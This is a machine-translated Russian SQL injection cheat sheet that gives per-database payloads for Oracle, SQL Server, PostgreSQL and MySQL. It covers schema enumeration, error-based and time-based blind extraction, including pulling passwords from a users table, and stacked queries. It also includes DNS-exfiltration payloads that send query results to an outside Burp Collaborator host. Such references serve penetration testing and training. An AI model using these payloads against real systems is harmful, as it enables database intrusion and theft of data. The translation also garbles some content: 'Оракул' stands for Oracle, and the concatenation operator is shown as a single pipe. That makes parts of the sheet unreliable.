## Конкатенация строк

Вы можете объединить несколько строк в одну строку.

|   |   |
|---|---|
|Оракул|`'foo'\|'bar'`|
|Майкрософт|`'foo'+'bar'`|
|PostgreSQL|`'foo'\|'bar'`|
|MySQL|`'foo' 'bar'`[Обратите внимание на пространство между двумя строками]  <br>`CONCAT('foo','bar')`|

## Подстрока

Вы можете извлечь часть строки из указанного смещения с указанной длиной. Обратите внимание, что индекс смещения основан на 1. Каждое из следующих выражений вернет строку `ba`.

|   |   |
|---|---|
|Оракул|`SUBSTR('foobar', 4, 2)`|
|Майкрософт|`SUBSTRING('foobar', 4, 2)`|
|PostgreSQL|`SUBSTRING('foobar', 4, 2)`|
|MySQL|`SUBSTRING('foobar', 4, 2)`|

## Комментарии

Вы можете использовать комментарии, чтобы обрезать запрос и удалить часть исходного запроса, которая следует за вашими входными данными.

|   |   |
|---|---|
|Оракул|`--comment   `|
|Майкрософт|`--comment   /*comment*/`|
|PostgreSQL|`--comment   /*comment*/`|
|MySQL|`#comment`  <br>`-- comment`[Обратите внимание на пробел после двойного тире]  <br>`/*comment*/`|

## Версия базы данных

Вы можете запросить базу данных, чтобы определить ее тип и версию. Эта информация полезна при формулировании более сложных атак.

|   |   |
|---|---|
|Оракул|`SELECT banner FROM v$version   SELECT version FROM v$instance   `|
|Майкрософт|`SELECT @@version`|
|PostgreSQL|`SELECT version()`|
|MySQL|`SELECT @@version`|

## Содержимое базы данных

Вы можете перечислить таблицы, существующие в базе данных, и столбцы, которые содержат эти таблицы.

|   |   |
|---|---|
|Оракул|`SELECT * FROM all_tables   SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`|
|Майкрософт|`SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   `|
|PostgreSQL|`SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   `|
|MySQL|`SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   `|

## Условные ошибки

Вы можете проверить одно логическое условие и вызвать ошибку базы данных, если условие истинно.

|   |   |
|---|---|
|Оракул|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`|
|Майкрософт|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`|
|PostgreSQL|`1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`|
|MySQL|`SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`|

## Извлечение данных с помощью видимых сообщений об ошибках

Потенциально вы можете получить сообщения об ошибках, которые приведут к утечке конфиденциальных данных, возвращаемых вашим вредоносным запросом.

|   |   |
|---|---|
|Майкрософт|`SELECT 'foo' WHERE 1 = (SELECT 'secret') > Conversion failed when converting the varchar value 'secret' to data type int.`|
|PostgreSQL|`SELECT CAST((SELECT password FROM users LIMIT 1) AS int) > invalid input syntax for integer: "secret"`|
|MySQL|`SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret'))) > XPATH syntax error: '\secret'`|

## Пакетные (или стекированные) запросы

Вы можете использовать пакетные запросы для последовательного выполнения нескольких запросов. Обратите внимание, что при выполнении последующих запросов результаты не возвращаются в приложение. Следовательно, этот метод в первую очередь полезен в отношении слепых уязвимостей, когда вы можете использовать второй запрос для запуска поиска DNS, условной ошибки или временной задержки.

|   |   |
|---|---|
|Оракул|`Does not support batched queries.`|
|Майкрософт|`QUERY-1-HERE; QUERY-2-HERE   QUERY-1-HERE QUERY-2-HERE`|
|PostgreSQL|`QUERY-1-HERE; QUERY-2-HERE`|
|MySQL|`QUERY-1-HERE; QUERY-2-HERE`|

#### Примечание

В MySQL пакетные запросы обычно не могут использоваться для SQL-инъекций. Однако иногда это возможно, если целевое приложение использует определенные API PHP или Python для связи с базой данных MySQL.

## Задержки времени

Вы можете вызвать временную задержку в базе данных при обработке запроса. Следующее вызовет безусловную временную задержку в 10 секунд.

|   |   |
|---|---|
|Оракул|`dbms_pipe.receive_message(('a'),10)`|
|Майкрософт|`WAITFOR DELAY '0:0:10'`|
|PostgreSQL|`SELECT pg_sleep(10)`|
|MySQL|`SELECT SLEEP(10)`|

## Условные задержки по времени

Вы можете проверить одно логическое условие и вызвать временную задержку, если условие истинно.

|   |   |
|---|---|
|Оракул|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`|
|Майкрософт|`IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`|
|PostgreSQL|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`|
|MySQL|`SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`|

## DNS-поиск

Вы можете заставить базу данных выполнить DNS-поиск внешнего домена. Для этого вам нужно будет использовать [Сотрудник Burp](https://portswigger.net/burp/documentation/desktop/tools/collaborator) чтобы сгенерировать уникальный поддомен Burp Collaborator, который вы будете использовать в своей атаке, а затем опросить сервер Collaborator, чтобы подтвердить, что произошел поиск DNS.

|   |   |
|---|---|
|Оракул|(XXE) уязвимость, вызывающая поиск DNS. Уязвимость была исправлена, но существует множество неисправленных установок Oracle:<br><br>`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`<br><br>Следующий метод работает на полностью исправленных установках Oracle, но требует повышенных привилегий:<br><br>`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')`|
|Майкрософт|`exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`|
|PostgreSQL|`copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`|
|MySQL|Следующие методы работают только в Windows:<br><br>`LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`  <br>`SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`|

## DNS-поиск с эксфильтрацией данных

Вы можете заставить базу данных выполнить DNS-поиск внешнего домена, содержащего результаты введенного запроса. Для этого вам нужно будет использовать [Сотрудник Burp](https://portswigger.net/burp/documentation/desktop/tools/collaborator) для создания уникального поддомена Burp Collaborator, который вы будете использовать в своей атаке, а затем опросите сервер Collaborator, чтобы получить сведения о любых взаимодействиях с DNS, включая извлеченные данные.

|   |   |
|---|---|
|Оракул|`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'\|(SELECT YOUR-QUERY-HERE)\|'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`|
|Майкрософт|`declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')`|
|PostgreSQL|`create OR replace function f() returns void as $$   declare c text;   declare p text;   begin   SELECT into p (SELECT YOUR-QUERY-HERE);   c := 'copy (SELECT '''') to program ''nslookup '\|p\|'.BURP-COLLABORATOR-SUBDOMAIN''';   execute c;   END;   $$ language plpgsql security definer;   SELECT f();`|
|MySQL|Следующий метод работает только в Windows:  <br>`SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`|